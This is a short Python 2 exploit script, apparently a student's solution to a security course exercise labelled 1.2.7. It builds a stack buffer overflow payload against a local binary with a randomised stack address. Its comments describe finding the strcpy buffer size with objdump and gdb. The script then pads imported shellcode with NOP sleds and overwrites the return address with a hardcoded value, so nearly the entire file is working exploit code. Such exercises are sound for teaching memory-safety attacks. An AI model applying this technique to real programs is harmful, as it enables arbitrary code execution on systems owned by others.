from shellcode import shellcode
from struct import pack
"""
1. Find payload for buf: use objdump -d ./1.2.7, check 1.2.7.txt and find vulnerable
I found that it loads 0x408 (1032 in decimal) for strcpy
2. Find location of randomize buf:
gdb --args ./1.2.7 $(python 1.2.7.py)
b vulnerable
r
print $ebp - 0x408
3. Fill NOP (0x408 - 0x100 - len(shellcode) + 4)
We need to fill 0x100 NOP first because this is the offset (0x110 - 0x10)
4. Fill shellcode
5. Fill the rest with NOP 0x100 because this is the range of the offset
6. Overwrite the return address
This return address can be changed +-0x100 bytes since this is randomize.
My address is: $ebp - 0x408 then + 0x100
"""
ret_addr = 0xbffecdc0
first_nop_len = 1036 - 0x100 - len(shellcode)
second_nop_len = 0x100

print "\x90" * first_nop_len + shellcode + "\x90" * second_nop_len + pack("<I", ret_addr)
